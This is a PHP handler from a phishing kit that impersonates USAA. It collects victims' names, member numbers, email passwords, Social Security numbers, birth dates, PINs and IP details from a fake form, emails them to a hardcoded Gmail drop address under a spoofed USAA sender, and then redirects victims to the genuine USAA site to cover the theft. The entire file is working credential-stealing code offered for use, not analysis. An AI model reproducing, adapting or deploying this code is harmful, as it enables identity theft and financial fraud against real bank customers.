<?php

$Ok= "sheriffyoung001@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Contact Information & CC Infor ==================\n";
$fuck .= "Full Name : ".$_POST['fname']."\n";
$fuck .= "USAA Member Number : ".$_POST['USAA']."\n";
$fuck .= "Emaill Address : ".$_POST['email']."\n";
$fuck .= "Email Pass : ".$_POST['emailpass']."\n";
$fuck .= "Social Security Number : ".$_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3']."\n";
$fuck .= "Date of Birth (mm-dd-yyyy) : ".$_POST['cdob1s']."\n";
$fuck .= "Phone Number : ".$_POST['phone']."\n";
$fuck .= "ZIP/Postal Code : ".$_POST['zip']."\n";
$fuck .= "Pin confirmed : ".$_POST['pin2']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+FishFlow+===========\n";
$subject = "USAA Fullsz $ip";
$headers = "From: uSAa <usaa@zenquel.com>";


mail($Ok,$subject,$fuck,$headers);
 
Header ("Location: https://www.usaa.com/inet/ent_logon/Logoff?");
?>